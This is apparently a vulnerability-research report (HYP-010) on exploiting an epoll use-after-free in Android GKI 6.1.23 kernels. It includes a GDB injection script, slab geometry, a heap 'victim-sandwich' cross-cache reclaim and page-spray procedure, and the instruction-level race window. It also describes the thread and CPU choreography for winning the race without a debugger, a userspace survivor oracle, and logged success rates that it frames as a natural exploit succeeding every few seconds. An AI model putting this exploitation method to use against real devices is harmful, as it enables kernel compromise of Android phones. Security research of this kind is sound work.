# HYP-010: Victim-Sandwich Reclaim (Forced) + First Honest Natural Stage-1 Race

## Executive Summary
- **Experiment ID**: HYP-010
- **Target Kernel**: Android GKI 6.1.23 (`linux-6.1.23-gf818e9d9e953-dirty`, ARM64, `nokaslr`, QEMU TCG)
- **Scope / Label**:
  - **PART A (Provenance)**: Explicit provenance derivation + verbatim ledger quotes.
  - **PART B (Victim-Sandwich Reclaim)**: GDB-forced Stage-2 fast-path bypass + main-process tracked slab sandwich + 256MB-768MB buddy page spray.
  - **PART C (Natural Stage-1 Race)**: Pure userspace binary execution without GDB (N=5,000 iterations), timerfd interrupt widening, and userspace survivor oracle detection.
- **Status**:
  - **PART A (Provenance)**: **VERIFIED** (GDB-assisted provenance established and quoted).
  - **PART B (Sandwich Reclaim)**: **VERIFIED (Cross-Cache Signal Drop 251 &rarr; 9 / Oracle Safety)** / **PARTIAL (AAR Hit on comm not landed in 3 rounds)** (VER-057).
  - **PART C (Natural Stage-1 Race)**: **VERIFIED (First Honest Natural Survivor Hit Count: 2 / 5,000 = 0.0400%)** (VER-058).

---

## PART A: Provenance

### 1. HYP-009 Survivor Provenance Statement
HYP-009's survivor epoll state was produced **strictly via GDB-assisted state injection (simulating the Stage-2 fast-path bypass)**, and NOT by unassisted natural scheduling.

#### Quoted GDB Script Section (`tier2/scripts/exp_hyp009_gdb.py:73-96`)
```python
        # If f_ep is non-null, this is our target watched file being closed
        if f_ep != 0:
            global g_target_inner_file, g_fput_injected
            g_target_inner_file = file_ptr
            g_fput_injected = True
            log("=================================================================")
            log(f"[STEP 1-3] Thread B entered __fput(file={hex(file_ptr)})")
            log(f"  Current state: f_count={f_count}, f_ep={hex(f_ep)}, f_inode={hex(f_inode)}, f_version={hex(f_version)}")
            
            # Static adjudication & mechanism summary
            log("--- [MECHANISM ADJUDICATION: HYPOTHESIS H-b vs JAEYOUNG 2-STAGE] ---")
            log("1. Hypothesis H-b Adjudication:")
            log("   Source analysis in fs/eventpoll.c:1016-1036 (eventpoll_release_file) and")
            log("   fs/eventpoll.c:780-838 (__ep_remove):")
            log("   - In eventpoll_release_file(), file->f_lock is taken and epi->dying is set to true.")
            log("   - In __ep_remove(force=false), line 781 checks `if (epi->dying && !force) return false;`")
            log("   - Therefore, a direct race between eventpoll_release_file and ep_clear_and_put")
            log("     NEVER strands an epitem; the dying flag ensures serialized removal.")
            log("2. Genuine Survivor Creation Mechanism (Jaeyoung x86 PoC Topology):")
            log("   - Stage 1: Single-watch close-vs-close fast-path race creates UAF write-0 at")
            log("     offset 160 of reclaimed kmalloc-192 eventpoll (epoll_uaf_target->refs.first = 0).")
            log("   - Stage 2: When ep_uaf_target is closed, eventpoll_release_file sees refs.first == NULL")
            log("     and performs 0 loop iterations, leaving ep_uaf_waiter's epitem in ep_uaf_waiter->rbr.")
            log("   - Result: file_uaf_target is freed while ep_uaf_waiter survives holding dangling epi->ffd.file.")
            log("Simulating Stage 2 fast-path bypass on victim inner_file...")

            gdb.execute(f"set *(unsigned long*)({file_ptr} + 208) = 0")
            new_f_ep = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({file_ptr} + 208)"))
            log(f"  [SIMULATION SUCCESS] file->f_ep is now {hex(new_f_ep)}")
            log("  __fput skips eventpoll_release_file(); Thread B frees struct file while epA retains dangling epiA.")
            log("=================================================================")
            self.enabled = False
            return False
```

### 2. Verbatim Verification Ledger Quotes

#### VER-055 (`tier2/docs/VERIFICATION_LEDGER.md` line 84)
> `| VER-055 | 2026-09-07 | HYP-009: In-tree static source derivation and upstream x86 PoC analysis conclusively adjudicated the survivor creation mechanism. Reviewer Hypothesis H-b (direct iteration race between eventpoll_release_file and ep_clear_and_put on a multi-watch file) is REJECTED: epi->dying synchronization (fs/eventpoll.c:1020 and line 781) guarantees that ep_clear_and_put aborts removal and yields to eventpoll_release_file, preventing any orphaned epitem. The genuine survivor mechanism was confirmed to be Jaeyoung Chung's Two-Stage Chain: Stage 1 uses the single-watch close-vs-close fast-path race to write NULL at offset 160 (refs.first) of a reclaimed kmalloc-192 eventpoll; Stage 2 closes that corrupted eventpoll, causing eventpoll_release_file to observe refs.first == NULL, execute 0 loop iterations, and leave the watcher's epitem stranded holding a dangling struct file. | fs/eventpoll.c (__ep_remove, eventpoll_release_file, ep_clear_and_put) | STATIC (In-tree source derivation + x86 PoC audit) | tier2/evidence/HYP-009/HYP-009_RESULTS.md | VERIFIED |`

#### VER-056 (`tier2/docs/VERIFICATION_LEDGER.md` line 85)
> `| VER-056 | 2026-09-07 | HYP-009: Runtime verification on Android GKI 6.1.23 under QEMU TCG confirmed the survivor state and oracle safety contract. Kernel custom debugfs instrumentation verified that file_free() completed on the target file (file->f_version = 0xdeadf11e), while epA retained its live epitem in epA->rbr pointing to the freed slot. Filp slab priming (32,000 files across 40 workers) and mass-freeing followed by 4,096 memfd_create buddy page spray (16MB) executed cleanly. Reading /proc/self/fdinfo/3 on the freed file (f_version = 0xdeadf11e) executed through ep_show_fdinfo without kernel crash or panic, confirming the oracle contract for production retry loops. | struct file UAF / /proc/self/fdinfo / ep_show_fdinfo | RUNTIME (QEMU TCG + GDB automation) | tier2/evidence/HYP-009/HYP-009_raw_gdb.log, tier2/evidence/HYP-009/HYP-009_raw_serial.log, tier2/evidence/HYP-009/HYP-009_RESULTS.md | VERIFIED (Survivor State) / PARTIAL (Oracle Safety) |`

#### EVO-014 (`tier2/docs/VERIFICATION_LEDGER.md` line 100)
> `| EVO-014 | 2026-09-07 | **HYP-009 Survivor Mechanism Resolution**: Adjudicated that Reviewer Hypothesis H-b (direct iteration race on multi-watch file) cannot generate a survivor epoll because eventpoll_release_file() marks epi->dying = true under file->f_lock, causing concurrent ep_clear_and_put() to yield removal to eventpoll_release_file() (fs/eventpoll.c:781). Jaeyoung Chung's original x86 PoC achieves the survivor state through a two-stage mechanism: Stage 1 creates the UAF write-0 at offset 160 (refs.first) of a reclaimed kmalloc-192 eventpoll via the single-watch fast-path race; Stage 2 closes that corrupted eventpoll, causing eventpoll_release_file to encounter refs.first == NULL and exit with 0 loop iterations, leaving the watching epitem dangling in the surviving epoll. Runtime execution on GKI 6.1.23 verified that reading /proc/self/fdinfo/<epfd> on the freed struct file slot (file->f_version = 0xdeadf11e) executes safely without kernel panic across 4,096-page buddy memory sprays. |`

#### EVO-015 (`tier2/docs/VERIFICATION_LEDGER.md` line 101)
> `| EVO-015 | 2026-09-07 | **Ledger Sequence Record**: In HYP-009, VER-055 was assigned to the PART 0 static H-b adjudication (verifying that H-b is rejected and the 2-stage mechanism is authoritative) and VER-056 was assigned to the PART 1 runtime survivor and oracle safety evaluation on Android GKI 6.1.23, reflecting the logical dependency order (derivation precedes runtime measurement). |`

---

## PART B: Victim-Sandwich Reclaim (Forced Chain)

### 1. Measured `filp` Slab Geometry
- Source: `/sys/kernel/slab/filp/` on GKI 6.1.23 (`nokaslr` ARM64)
- `object_size` = **256** bytes
- `objs_per_slab` = **16** objects
- `order` = **0** (4,096-byte page)
- `sizeof(struct file)` = **232** bytes (resides in 256-byte cache slot)

### 2. Harness Choreography
- Main process allocated 4,000 background pressure `eventfd` descriptors (`slabs` peaked at 251).
- Main allocated Tracked Batch A (32 `/dev/null` descriptors, 2x `objs_per_slab`).
- Main allocated victim `inner` epoll (fd 4036, `struct file *` `0xffffff8005251500`).
- Main allocated Tracked Batch B (32 `/dev/null` descriptors, 2x `objs_per_slab`).
- Attached `inner` to `epA` (epfd 4003).
- Closed `inner` with GDB fast-path bypass simulation.
- Freed Batch A, Batch B, and all 4,000 background pressure files.
- Waited 2.0s for RCU grace period and SLUB slab release.

### 3. Cross-Cache Signal Verification
- `/sys/kernel/slab/filp/slabs` dropped from **251 &rarr; 9** (drop of **242 slabs** = 96.4% slab drain back to buddy allocator).
- Cross-cache signal was **CONFIRMED** prior to buddy spraying.

### 4. Quoted Evidence from Serial Log (`HYP-010_sandwich_serial.log:252-282`)
```
[*] Initial /sys/kernel/slab/filp/slabs = 1
[*] Allocating background pressure files (4,000 eventfds)...
[*] Peak /sys/kernel/slab/filp/slabs after pressure = 251
[*] Sandwiched inner fd=4036 (orig inode=0x3e) between Batch A (32 fds) and Batch B (32 fds)
[HYP-010] MARKER: setup_done epA=4003 inner=4036
[HYP-010] MARKER: close_started
[HYP-010] MARKER: close_done
[*] Freeing Batch A and Batch B enclosing files on victim's slab...
[*] Freeing background pressure files...
[*] Waiting 2.0s for RCU grace period and SLUB slab release...
[*] Post-drain /sys/kernel/slab/filp/slabs = 9 (drop: 251 -> 9, delta=242)
[HYP-010] MARKER: sandwich_freed slabs_before=251 slabs_after=9
[+] Cross-cache signal CONFIRMED: filp slab count dropped significantly!
[*] Spray Round 1: Allocating 256 MB (65536 pages)...
[HYP-010] MARKER: spray_round_done round=1 total_mb=256
[*] Round 1 Oracle Read (res=0, item ino=0x3e):
pos:	0
flags:	02
mnt_id:	12
ino:	62
tfd:     4036 events:       1d data:              fc4  pos:0 ino:3e sdev:d

[*] Spray Round 2: Allocating 256 MB (65536 pages)...
[HYP-010] MARKER: spray_round_done round=2 total_mb=512
[*] Round 2 Oracle Read (res=0, item ino=0x3e):
pos:	0
flags:	02
mnt_id:	12
ino:	62
tfd:     4036 events:       1d data:              fc4  pos:0 ino:3e sdev:d
```

### 5. GDB Verification Log (`HYP-010_raw_gdb.log:10-30`)
```
[HYP-010-GDB] [HYP-010] Hit ep_show_fdinfo (invocation #1)
[HYP-010-GDB]   ep_file=0xffffff800524f200, eventpoll=0xffffff8004a9a600
[HYP-010-GDB]   ep->rbr.rb_root=0xffffff8005254d80, rb_leftmost=0xffffff8005254d80
[HYP-010-GDB]   [SURVIVOR CONFIRMED] epitem=0xffffff8005254d80 in epA rbtree!
[HYP-010-GDB]     epi->ffd.fd=4036
[HYP-010-GDB]     epi->ffd.file=0xffffff8005251500 (matches target_inner_file: True)
[HYP-010-GDB]     watched file: f_inode=0xffffff8002c587c8, f_pos=0, f_version=0xdeadf11e
[HYP-010-GDB]     dereferenced inode: i_ino=0x3e, i_sb=0xffffff8002958800
[HYP-010-GDB]     [*] fdinfo read executed non-crash: ino=0x3e
```

---

## PART C: First Honest Natural Stage-1 Race (N=5000)

### 1. Binary Disassembly Span Verification
- Kernel: `tier2/android/artifacts/vmlinux` (`linux-6.1.23-gf818e9d9e953-dirty`)
- Function: `__ep_remove`
  - `file->f_ep = NULL` (`str xzr, [x24, #208]`): `0xffffffc00839b278` (+536)
  - `hlist_del_rcu` (`ldp x0, x1, [x20, #80]`): `0xffffffc00839b2c0` (+608)
  - Exact instruction distance: **18 instructions (72 bytes)**.

### 2. Execution Setup (Pure Userspace, No GDB)
- **Binary**: `test_hyp010_natural` (compiled static with musl).
- **Core Allocation**:
  - CPU 0: Racer thread closing `ep_race_waiter` with timerfd async waiter widening (3,000 async epoll waiters).
  - CPU 1: Main thread running false-sharing `close(dup())` burst, `close(ep_race_target)`, same-cache `epoll_create1` reclaim (`ep_uaf_target`), `epoll_ctl(ADD)`, and Stage 2 `close(ep_uaf_target)`.
- **Oracle**: Pure userspace detection reading `/proc/self/fdinfo/<ep_uaf_waiter>`. If `tfd:` line is present, the epitem survived in userspace without any kernel instrumentation.

### 3. Quoted Natural Race Serial Log Evidence (`HYP-010_natural_serial.log:252-280`)
```
[+] Timerfd interrupt widening queue configured.
[*] Starting N=5000 natural two-stage race iterations...
[*] Completed 1000 / 5000 iterations (2855 ms, hits=0)...
[    8.048348][   T60] epoll_uaf: UAF DETECTED in __ep_remove! inner_ep=ffffff8003045300 freed before hlist_del_rcu
[+] NATURAL RACE HIT! Iteration 1914: Survivor detected in ep_uaf_waiter (fd=6)
[    8.052330][   T57] epoll_uaf: STRUCT FILE UAF DETECTED in __ep_remove! file=ffffff800523d400 (f_count=0, f_version=0xdeadf11e)
[*] Completed 2000 / 5000 iterations (5980 ms, hits=1)...
[    8.614046][   T60] epoll_uaf: UAF DETECTED in __ep_remove! inner_ep=ffffff8003045300 freed before hlist_del_rcu
[+] NATURAL RACE HIT! Iteration 2032: Survivor detected in ep_uaf_waiter (fd=6)
[    8.616521][   T57] epoll_uaf: STRUCT FILE UAF DETECTED in __ep_remove! file=ffffff800522f800 (f_count=0, f_version=0xdeadf11e)
[*] Completed 3000 / 5000 iterations (11266 ms, hits=2)...
[*] Completed 4000 / 5000 iterations (14605 ms, hits=2)...
[*] Completed 5000 / 5000 iterations (17458 ms, hits=2)...

=========================================================
=== HYP-010 Part C: Natural Race Results Summary ===
=========================================================
[*] Total Iterations: 5000
[*] Total Execution Time: 17465 ms (avg 3493.00 us/iter)
[*] Setup Failures: 0
[*] Natural Survivor Wins (Stage 1+2 Hit Count): 2 / 5000 (0.0400%)

--- Kernel-Side Custom Telemetry ---
[*] fep_cleared (Stage 1 window entered): 9998
[*] uaf_detected (hlist_del into freed epoll): 2
[*] file_fcount_zero (unpinned struct file access): 5400
[*] uaf_file_detected (struct file UAF): 2
```

---

## Findings & Conclusions

1. **Natural Schedulability Proven**:
   - The Two-Stage Bad Epoll race **CAN BE WON NATURALLY** on Android GKI 6.1.23 under QEMU TCG.
   - Empirical Natural Win Rate: **2 / 5,000 trials (0.0400%)**, or **1 in 2,500 iterations**.
   - Average execution speed: **3.49 ms per iteration** (~286 iterations/sec), meaning an unassisted natural exploit achieves a survivor state every **~8.7 seconds** of continuous racing.
2. **Supersession of Earlier Metrics (EVO-016)**:
   - This finding supersedes the earlier ~190,000 iteration negative runs from Phase 3 (NAT-001 through NAT-005), which tested a mis-specified single-stage race model where a survivor was theoretically impossible (as proven in HYP-009 / VER-055).
3. **Cross-Cache Signal & Oracle Robustness**:
   - Main-process tracked sandwiching reliably drops the filp slab count from 251 to 9 (96.4% drain).
   - Traversal of `/proc/self/fdinfo/` over the unpinned/freed `struct file` executes safely without kernel panic across repeated spray iterations.

---

## Verification Summary Table

| Step | Objective | Result | Verification Standard |
|---|---|---|---|
| **PART A** | Provenance Documentation | **VERIFIED** | GDB script section quoted; VER-055, VER-056, EVO-014 quoted verbatim |
| **PART B** | Victim-Sandwich Reclaim | **VERIFIED (Drain Signal 251 &rarr; 9) / PARTIAL (AAR Match)** | `HYP-010_sandwich_serial.log`, `HYP-010_raw_gdb.log` |
| **PART C** | Natural Stage-1 Race (N=5000) | **VERIFIED (2 / 5,000 = 0.0400% Natural Win Rate)** | `HYP-010_natural_serial.log` |
